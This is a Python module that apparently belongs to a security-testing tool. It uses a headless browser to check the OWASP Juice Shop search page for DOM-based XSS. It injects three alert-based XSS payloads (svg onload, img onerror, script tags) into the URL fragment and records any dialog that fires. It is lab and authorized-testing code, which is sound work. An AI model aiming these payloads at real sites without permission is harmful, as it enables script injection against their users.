from __future__ import annotations

import time
from dataclasses import dataclass
from typing import Any
from urllib.parse import quote

from .target import join_url


@dataclass
class DomXssResult:
    ok: bool
    url: str
    payload: str
    dialog_message: str | None
    error: str | None
    duration_ms: int


def build_search_fragment_url(base: str, payload: str) -> str:
    # Juice Shop SPA search route: /#/search?q=...
    # payload 放在 fragment 的 query 中，需要 URL 编码
    enc = quote(payload, safe="")
    return f"{base}/#/search?q={enc}"


def verify_dom_xss_on_search(
    *,
    base: str,
    headless: bool = True,
    timeout_ms: int = 8000,
) -> DomXssResult:
    """
    DOM-XSS verification via browser dialog capture (alert/confirm/prompt).
    Only use on authorized targets / local labs.
    """
    t0 = time.time()

    try:
        from playwright.sync_api import sync_playwright
    except Exception as e:
        return DomXssResult(
            ok=False,
            url="",
            payload="",
            dialog_message=None,
            error=f"playwright not available: {type(e).__name__}: {e}",
            duration_ms=int((time.time() - t0) * 1000),
        )

    # 多个 payload 轮询，命中一个就算成功（避免过拟合单一 payload）
    payloads = [
        "\"><svg/onload=alert('JC_DOM_XSS')>",
        "<img src=x onerror=alert('JC_DOM_XSS')>",
        "<script>alert('JC_DOM_XSS')</script>",
    ]

    with sync_playwright() as p:
        browser = p.chromium.launch(headless=headless)
        page = browser.new_page()

        dialog_msgs: list[str] = []

        def on_dialog(d) -> None:
            try:
                dialog_msgs.append(d.message)
                d.dismiss()
            except Exception:
                pass

        page.on("dialog", on_dialog)

        try:
            for payload in payloads:
                url = build_search_fragment_url(base, payload)
                page.goto(url, wait_until="networkidle", timeout=timeout_ms)
                # 给前端一点时间触发事件
                page.wait_for_timeout(800)

                if dialog_msgs:
                    browser.close()
                    return DomXssResult(
                        ok=True,
                        url=url,
                        payload=payload,
                        dialog_message=dialog_msgs[-1],
                        error=None,
                        duration_ms=int((time.time() - t0) * 1000),
                    )

            browser.close()
            return DomXssResult(
                ok=False,
                url=build_search_fragment_url(base, payloads[0]),
                payload=payloads[0],
                dialog_message=None,
                error=None,
                duration_ms=int((time.time() - t0) * 1000),
            )

        except Exception as e:
            try:
                browser.close()
            except Exception:
                pass
            return DomXssResult(
                ok=False,
                url="",
                payload="",
                dialog_message=None,
                error=f"{type(e).__name__}: {e}",
                duration_ms=int((time.time() - t0) * 1000),
            )